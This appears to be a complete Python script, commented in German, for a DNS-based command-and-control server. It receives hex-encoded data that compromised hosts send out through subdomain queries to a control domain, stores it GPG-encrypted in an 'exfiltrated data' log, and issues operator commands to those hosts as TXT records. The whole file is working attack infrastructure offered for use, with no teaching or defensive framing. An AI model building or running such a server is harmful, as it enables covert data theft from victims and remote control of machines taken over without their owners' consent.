import datetime
import gnupg
import os
import time
import binascii
import socket
from dnslib import DNSHeader, DNSQuestion, RR, A, TXT, QTYPE
from dnslib.server import DNSServer, BaseResolver

# --- Konfiguration ---
LOG_FILE = "exfiltrated_data.log.gpg"
CONTROL_DOMAIN = "your-secret-c2-domain.com." # Wichtig: mit Punkt am Ende!
PUBLIC_KEY_FILE = "public.key"
COMMAND_FILE = "command.txt" # Datei zur Befehlseingabe
IP_OF_THIS_SERVER = "127.0.0.1" # Die IP, auf die A-Record-Anfragen zeigen sollen

# --- GPG Initialisierung ---
try:
    gpg = gnupg.GPG()
    with open(PUBLIC_KEY_FILE, "r") as f:
        key_data = f.read()
    import_result = gpg.import_keys(key_data)
    GPG_FINGERPRINT = import_result.results[0]['fingerprint']
    print(f"[+] GPG-Schlüssel erfolgreich importiert: {GPG_FINGERPRINT}")
except Exception as e:
    print(f"[!] KRITISCHER FEHLER bei GPG-Initialisierung: {e}")
    exit(1)


class C2Resolver(BaseResolver):
    """
    Ein benutzerdefinierter DNS-Resolver, der unsere C2-Logik implementiert.
    """
    def resolve(self, request, handler):
        qname = request.q.qname
        
        # Logge jede eingehende Anfrage (zur Fehlersuche)
        print(f"[*] Eingehende Anfrage für: {qname}")

        # Standard-Antwort vorbereiten (als ob die Domain existiert)
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(IP_OF_THIS_SERVER), ttl=60))

        # --- C2-Logik ---
        # Format: <data>.<session_id>.logs.<domain>
        # Format: checkin.<session_id>.cmd.<domain>
        
        # KORREKTUR: Robustes Parsing der Anfrage
        qname_str = str(qname)
        if not qname_str.endswith(CONTROL_DOMAIN):
            print(f"[*] Ignoriere Anfrage, die nicht zur Kontrolldomain gehört: {qname_str}")
            return reply

        subdomain_part = qname_str[:-len(CONTROL_DOMAIN)]
        parts = subdomain_part.split('.')
        
        # Erwarte: data.session.type. (also 4 Teile, letzter ist leer)
        if len(parts) != 4 or parts[3] != '':
            print(f"[*] Ignoriere falsch formatierte Anfrage: {qname_str}")
            return reply
            
        data_part, session_id, type_part = parts[0], parts[1], parts[2]

        # 1. Datenexfiltration verarbeiten
        if type_part == "logs":
            self.log_data(data_part, session_id)

        # 2. C2 Check-in verarbeiten
        elif type_part == "cmd":
            command = self.get_command(session_id)
            print(f"[*] Check-in von Session {session_id}. Sende Befehl: '{command}'")
            # Füge den Befehl als TXT-Record zur Antwort hinzu
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command), ttl=60))
        
        return reply

    def log_data(self, hex_data, session_id):
        """Verschlüsselt und speichert die eingehenden Daten."""
        try:
            # 1. Hex-Daten dekodieren
            raw_data = binascii.unhexlify(hex_data)
            
            # 2. Zeitstempel und Metadaten hinzufügen
            timestamp = datetime.datetime.utcnow().isoformat()
            log_entry = f"[{timestamp}] - Session: {session_id}\n{raw_data.decode('utf-8', 'ignore')}\n"
            
            # 3. Daten mit GPG verschlüsseln
            encrypted_data = gpg.encrypt(log_entry, recipients=[GPG_FINGERPRINT], always_trust=True)
            
            if not encrypted_data.ok:
                print(f"[!] GPG-Verschlüsselung fehlgeschlagen: {encrypted_data.status}")
                return

            # 4. Verschlüsselte Daten in Logdatei schreiben
            with open(LOG_FILE, "ab") as f: # 'ab' für append binary
                f.write(encrypted_data.data)

            print(f"[+] Daten von Session {session_id} erfolgreich geloggt ({len(raw_data)} bytes).")

        except Exception as e:
            print(f"[!] Fehler beim Loggen der Daten: {e}")
    
    def get_command(self, session_id):
        """Liest den aktuellen Befehl aus der command.txt-Datei."""
        # Optional: session_id könnte für gezielte Befehle verwendet werden
        try:
            with open(COMMAND_FILE, "r") as f:
                return f.read().strip()
        except FileNotFoundError:
            return "CMD:SLEEP:300" # Standardbefehl, wenn keine Datei existiert

def main():
    # KORREKTUR: Port-Check, um sicherzustellen, dass wir mit den nötigen Rechten laufen
    if os.name != "nt" and os.geteuid() != 0:
        print("[!] KRITISCHER FEHLER: Dieser Server muss mit Root-Rechten gestartet werden, um auf Port 53 lauschen zu können.")
        exit(1)

    print("[*] C2 DNS-Server (Stufe 3) wird gestartet...")
    print(f"[*] Kontrolldomain: {CONTROL_DOMAIN}")
    
    resolver = C2Resolver()
    # Wir lauschen auf Port 53 auf allen Interfaces
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    
    print("[*] Server läuft auf 0.0.0.0:53... (Benötigt Root/Admin-Rechte)")
    server.start_thread()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Server wird heruntergefahren.")
    finally:
        server.stop()

if __name__ == "__main__":
    # Stelle sicher, dass die Bibliothek installiert ist
    try:
        import dnslib
    except ImportError:
        print("[!] FEHLER: dnslib ist nicht installiert. Bitte 'pip install dnslib' ausführen.")
    else:
        main() 